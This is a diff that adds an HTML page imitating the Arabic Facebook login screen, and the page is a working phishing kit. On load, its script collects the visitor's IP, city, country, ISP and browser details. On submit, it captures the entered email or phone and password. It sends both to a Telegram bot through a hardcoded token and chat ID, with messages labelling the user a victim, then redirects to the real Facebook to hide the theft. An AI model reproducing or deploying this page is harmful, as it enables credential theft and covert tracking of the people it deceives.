@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول أو الاشتراك في فيسبوك</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { width: 100%; max-width: 400px; text-align: center; padding: 20px; }
+        .logo { color: #1877f2; font-size: 50px; font-weight: bold; margin-bottom: 20px; font-family: sans-serif; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        input { width: 92%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; outline: none; }
+        .btn-login { width: 98%; padding: 14px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .footer-links { margin-top: 15px; color: #1877f2; text-decoration: none; font-size: 14px; display: block; }
+        .create-btn { margin-top: 20px; padding: 12px; background-color: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; width: 60%; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">facebook</div>
+    <div class="login-box">
+        <form id="trapForm">
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit" class="btn-login">تسجيل الدخول</button>
+            <a href="#" class="footer-links">هل نسيت كلمة السر؟</a>
+        </form>
+        <hr style="margin: 20px 0; border: 0; border-top: 1px solid #dddfe2;">
+        <button class="create-btn">إنشاء حساب جديد</button>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8821066425:AAEavxYk0ErHKamxBqnl0ZosJGbiZUskoXc'; 
+    const CHAT_ID = '1010432372';
+
+    async function sendToBot(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+        } catch (e) {
+            console.error("Bot Error");
+        }
+    }
+
+    async function grabEverything() {
+        try {
+            // سحب الـ IP والموقع الجغرافي
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            
+            const info = `🚨 ضحية جديدة دخلت الرابط! \n\n🌐 IP: ${data.ip}\n📍 المدينة: ${data.city}\n🌍 الدولة: ${data.country_name}\n🏢 المزود: ${data.org}\n📱 الجهاز: ${navigator.userAgent}`;
+            await sendToBot(info);
+            
+        } catch (error) {
+            await sendToBot("🚨 ضحية جديدة دخلت ولكن تعذر جلب الـ IP");
+        }
+    }
+
+    // تشغيل السحب فور فتح الصفحة
+    window.onload = grabEverything;
+
+    // سحب بيانات الحساب عند تسجيل الدخول
+    document.getElementById('trapForm').onsubmit = async (e) => {
+        e.preventDefault();
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        
+        const accountData = `🔑 بيانات حساب مسروقة! \n\n📧 الإيميل/الهاتف: ${email}\n🔒 الباسورد: ${pass}`;
+        await sendToBot(accountData);
+        
+        // تحويل للفيسبوك الحقيقي للتغطية
+        window.location.href = "https://www.facebook.com";
+    };
+</script>
+
+</body>
+</html>
